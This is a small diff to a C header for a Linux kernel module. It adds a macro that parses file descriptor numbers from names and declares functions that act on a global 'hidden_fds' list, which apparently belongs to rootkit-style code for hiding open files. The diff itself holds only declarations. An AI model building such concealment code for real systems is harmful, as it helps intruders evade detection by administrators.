@@ -3,6 +3,8 @@
 
 #include <linux/types.h>
 
+#define FD_FROM_NAME(name) ((int)simple_strtol((name), NULL, 10))
+
 typedef struct fd_list *fd_list_t_ptr;
 typedef struct fd_list {
     int fd;
@@ -12,7 +14,8 @@ typedef struct fd_list {
 
 extern fd_list_t hidden_fds;
 
-pid_t may_fd(struct file *dirfile);
+pid_t may_fd(struct file *);
+void fill_fds(pid_t);
 
 void clear_hidden_fds(void);
 bool list_contains_fd(fd_list_t_ptr, int);
